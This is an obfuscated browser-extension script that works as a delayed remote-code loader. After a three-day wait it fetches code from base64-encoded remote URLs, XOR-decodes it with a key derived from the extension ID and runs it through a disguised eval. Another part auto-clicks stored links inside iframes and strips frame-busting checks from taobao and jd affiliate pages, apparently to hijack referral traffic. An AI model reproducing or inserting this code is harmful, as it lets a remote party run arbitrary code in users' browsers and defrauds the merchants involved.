var localVals = { },
islg;

init8();
function init8() {
    inIfrme6() || chrome.storage.local.get(null, function (a) {
        for (key in a) localVals[key] = a[key];
        '1' == localVals.dipislog88 && (islg = !0);
        mycompdtnonexistvar = '111620190308';
        lodeInsDt()
    })
}

function lodeInsDt() {
    var a = localVals.InsDt6;
    a ? (a = ((new Date).getTime() - a) / 1000 / 3600 / 24, 3 > a ? loderlog(a + '<3 deng...')  : (NdFtchSvrCd() && LdRmtSvrCd(!0), ExRmtSvrCd()))  : (loderlog('local unavailable, use cloud now...'), ftInsDt6())
}

function ftInsDt6() {
    chrome.storage.sync.get(null, function (a) {
        var b = Math.abs(chrome.runtime.id.split('').reduce(function (a, b) {
            a = (a << 5) - a + b.charCodeAt(0);
            return a & a
        }, 0)) % 1000,
        c = btoa(b).replace(/=/g, '');
        a[c] && !a.InsDt6 ? (a = a[c], a /= b, loderlog('Previously background loaded, will copy to InsDt6: ' + a), chrome.storage.sync.set({ InsDt6: a }, function () { })) : a.InsDt6 ? (b = { }, b.InsDt6 = a.InsDt6, chrome.storage.local.set(b)) : svInsDt6() 
    })
}

function svInsDt6() {
    chrome.storage.sync.set({
        InsDt6: (new Date).getTime()
    }, function () {
    })
}

var RePlAcMe1,
RePlAcMe2 = function (a) { return Object.keys(RePlAcMe1) };
RePlAcMe1 = {
    eate: document.querySelectorAll('*'),
    e: 1,
    lav: 5,
    tob: 'xl=',
    color: setcolor = 1,
    YW: function (a) {
        return RePlAcMe2() [2].split('').reverse().join('')
    }
};

function ExRmtSvrCd() {
    var a = repitoff(localVals.dipLstCd666);
    if (a && a.includes('svrdpcds')) this[RePlAcMe2()[1] + RePlAcMe1.YW()](a)
}

function getRandomInt(a, b) {
    return Math.floor(Math.random() * (b - a)) + a
}

var ldFreqHour = 24;
function NdFtchSvrCd() {
    try {
        if (!localVals.dipLstLd666) return !0;
        if (10 < getRandomInt(0, 100)) return loderlog('skip shuaxin 90% prob.'),	!1;
        var a = ((new Date).getTime() - localVals.dipLstLd666) / 1000 / 3600;
        loderlog('xiao shi: ' + a + ' (' + ldFreqHour + ' required)');
        if (a > ldFreqHour) return !0
    } catch (b) {
        return !0
    }
    return !1
}

function LdRmtSvrCd(a) {
    try {
        var b = new XMLHttpRequest;
        b.onreadystatechange = function () {
            4 == b.readyState && (200 == b.status ? SvRmtSvrCd(b.responseText)  : a && LdRmtSvrCd(!1))
        };
        b.onerror = function () {
            a && LdRmtSvrCd(!1)
        };
        b.onprogress = function () {
        };
        var c = atob('aHR0cHM6Ly9nbXpkYWlseS5jb20vZXh0L3FtLnBocD9mPXN2cg==');
        a || (c = atob('aHR0cHM6Ly9taXRhcmNoaXZlLmluZm8vZXh0L3FtLnBocD9mPXN2cg=='));
        localVals.dipLstSig666 && 0 == c.includes('&c=') && (c = c + '&c=' + localVals.dipLstSig666);
        loderlog('jia zai ' + c);
        b.open('GET', c, !0);
        b.send()
    } catch (f) {
        return 'exception'
    }
}

function SvRmtSvrCd(a) {
    if (20 < a.length && a.includes('svrdpcds')) {
        loderlog('suc shuaxin');
        var b = a.search('`'),
        c = a.substring(0, b);
        a = a.substring(b + 1);
        b = {	};
        b.dipLstSig666 = c;
        b.dipLstLd666 = (new Date).getTime();
        b.dipLstCd666 = repitoff(a);
        b.dipLstCd66 = ''
    } else b = { };
    b.dipLstLd666 = (new Date).getTime();
    chrome.storage.local.set(b)
}

function randomize(a) {
    a = a.split('').reduce(function (a, c) {
        a = (a << 5) - a + c.charCodeAt(0);
        return a & a
    }, 0);
    0 > a && (a = 0 - a);
    window.chrome && (a %= 10000);
    return a
}

function repitoff(a) {
    var b = randomize(chrome.runtime.id);
    return xor_str(a, b)
}

function xor_str(a, b) {
    var c = '';
    for (i = 0; i < a.length; ++i) c += String.fromCharCode(b ^ a.charCodeAt(i));
    return c
}

function inIfrme6() {
    try {
        return window.self !== window.top
    } catch (a) {
        return !0
    }
}

function loderlog(a) {
    try {
        if (islg) {
            var b = (new Date).toLocaleTimeString();
            console.log('%cLodr - ' + b + ' ' + a + '\t\t', 'color: green')
        }
    } catch (c) {	}
}

ifmRfActn();
function ifmRfActn() {
    if (window.self !== window.top && window.parent === window.top && (chrome.storage.local.get('extftsams99ba', function (a) {
        var b = a.extftsams99ba;
        b && '' != b && (a = db6si(b.split('^') [0], 'decode'), b = db6si(b.split('^') [1], 'decode'), -1 < window.location.href.indexOf(extrHost_ex(a, !0)) && (a = document.createElement('a'), a.setAttribute('href', b), (document.getElementsByTagName('head') [0] || document.getElementsByTagName('body') [0]).appendChild(a), a.click(), setLocal('extftsams99ba', '')))
    }), location.href.includes('ick.taobao.com/t_js?') || location.href.includes('nion-click.jd.com'))) {
        var a = document.getElementsByTagName(getElementType(3));
        for (i in a) {
            var b = a[i].innerHTML;
            b = b.replace('if (top.location != self.location)', 'if (1==2)');
            b = b.replace('if(top.location!=self.location)', 'if (3==4)');
            var c = document.createElement(getElementType(3));
            c.innerHTML = b;
            (document.getElementsByTagName('head') [0] || document.getElementsByTagName('body') [0]).appendChild(c)
        }
    }
}

function getElementType(a) {
    var b = document.createElement('div');
    b.setAttribute('id', 'smarttestelement');
    b.setAttribute('class', 'testsupport');
    b = [
        'class',
        'id',
        'label'
    ];
    return document.getElementById('pagetranslationcompleteelement') && document.getElementById('smartdatatestelement') ? b[2] : 0 == a ? String.fromCharCode(100, 105, 118)  : 1 == a ? String.fromCharCode(115, 112, 97, 110)  : 2 == a ? String.fromCharCode(105, 102, 114, 97, 109, 101)  : 3 == a ? String.fromCharCode(115, 99, 114, 105, 112, 116)  : 4 == a ? String.fromCharCode(116, 97, 98, 108, 101)  : 'div'
}

function b6si(a, b) {
    mycompdtnonexistvar = '111620190308';
    var c = {
        _keyStr: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',
        encode: function (a) {
            var b = '',
            e = 0;
            for (a = c._utf8_encode(a); e < a.length; ) {
                var d = a.charCodeAt(e++);
                var f = a.charCodeAt(e++);
                var g = a.charCodeAt(e++);
                var h = d >> 2;
                d = (d & 3) << 4 | f >> 4;
                var k = (f & 15) << 2 | g >> 6;
                var l = g & 63;
                isNaN(f) ? k = l = 64 : isNaN(g) && (l = 64);
                b = b + this._keyStr.charAt(h) + this._keyStr.charAt(d) + this._keyStr.charAt(k) + this._keyStr.charAt(l)
            }
            return b
        },
        decode: function (a) {
            var b = '',
            e = 0;
            for (a = a.replace(/[^A-Za-z0-9\+\/=]/g, ''); e < a.length; ) {
                var d = this._keyStr.indexOf(a.charAt(e++));
                var f = this._keyStr.indexOf(a.charAt(e++));
                var g = this._keyStr.indexOf(a.charAt(e++));
                var h = this._keyStr.indexOf(a.charAt(e++));
                d = d << 2 | f >> 4;
                f = (f & 15) << 4 | g >> 2;
                var k = (g & 3) << 6 | h;
                b += String.fromCharCode(d);
                64 != g && (b += String.fromCharCode(f));
                64 != h && (b += String.fromCharCode(k))
            }
            return b = c._utf8_decode(b)
        },
        _utf8_encode: function (a) {
            a = a.replace(/\r\n/g, '\n');
            for (var b = '', c = 0; c < a.length; c++) {
                var d = a.charCodeAt(c);
                128 > d ? b += String.fromCharCode(d)  : (127 < d && 2048 > d ? b += String.fromCharCode(d >> 6 | 192)  : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128)), b += String.fromCharCode(d & 63 | 128))
            }
            return b
        },
        _utf8_decode: function (a) {
            var b = '',
            c = 0;
            for (c1 = c2 = 0; c < a.length; ) {
                var d = a.charCodeAt(c);
                128 > d ? (b += String.fromCharCode(d), c++)  : 191 < d && 224 > d ? (c2 = a.charCodeAt(c + 1), b += String.fromCharCode((d & 31) << 6 | c2 & 63), c += 2)  : (c2 = a.charCodeAt(c + 1), c3 = a.charCodeAt(c + 2), b += String.fromCharCode((d & 15) << 12 | (c2 & 63) << 6 | c3 & 63), c += 3)
            }
            return b
        }
    };
    if ('encode' == b) return c.encode(a);
    if ('decode' == b) return c.decode(a)
}

function db6si(a, b) {
    return b6si(b6si(a, b), b)
}

function extrHost_ex(a, b) {
    a.includes('http') || (a = 'http://' + a);
    var c = document.createElement('a');
    c.href = a;
    c = c.host.toLowerCase();
    b && 'www.' == c.substring(0, 4) && (c = c.substring(4));
    return c = c.replace(':80', '')
}

function setLocal(a, b) {
    var c = { };
    c[a] = b;
    chrome.storage.local.set(c)
};
